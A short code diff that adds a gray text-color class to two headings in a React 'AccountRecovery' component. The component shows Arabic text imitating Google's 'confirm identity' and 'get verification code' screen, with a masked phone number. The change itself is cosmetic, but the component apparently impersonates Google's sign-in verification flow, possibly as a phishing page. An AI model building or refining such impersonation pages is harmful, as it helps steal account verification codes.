@@ -63,7 +63,7 @@ export default function AccountRecovery() {
 
         
 
-          <h1 className="text-2xl md:text-3xl font-semibold mb-2">تأكيد الهوية</h1>
+          <h1 className="text-2xl md:text-3xl font-semibold mb-2 text-gray-600">تأكيد الهوية</h1>
           <p className="text-gray-700 mb-6 text-sm md:text-base" dir="rtl">
             للمساعدة في الحفاظ على أمان حسابك، تريد Google التأكد من أنك بالفعل تحاول تسجيل الدخول
           </p>
@@ -85,7 +85,7 @@ export default function AccountRecovery() {
             height={150}
             className="mb-4 w-[70%] md:w-[200px] h-auto"
           />
-          <h2 className="text-base md:text-lg font-semibold mb-2">الحصول على رمز التحقق</h2>
+          <h2 className="text-base md:text-lg font-semibold mb-2 text-gray-600">الحصول على رمز التحقق</h2>
           <p className="text-gray-700 text-sm mb-2">
               •••-•••-••13 سيتم إرسال رمز التحقق إلى
               </p>
